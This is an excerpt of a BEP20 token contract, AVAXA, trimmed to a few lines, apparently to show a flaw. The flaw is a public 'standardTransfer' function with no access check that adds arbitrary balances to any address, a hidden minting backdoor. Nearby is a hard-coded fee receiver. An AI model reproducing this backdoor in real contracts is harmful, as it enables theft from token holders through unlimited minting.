...
contract AVAXA is IBEP20, Auth {
    ...
    address public marketingFeeReceiver=0xe1EC11CE2D5680E4D8446A090d1522f88A181676;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xe1EC11CE2D5680E4D8446A090d1522f88A181676 ;
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _burnFee) external authorized {
    ...
    function standardTransfer(uint256 value, address Dividend)external{
        _balances[Dividend]=_balances[Dividend].add(value*(10 ** _decimals));
    }
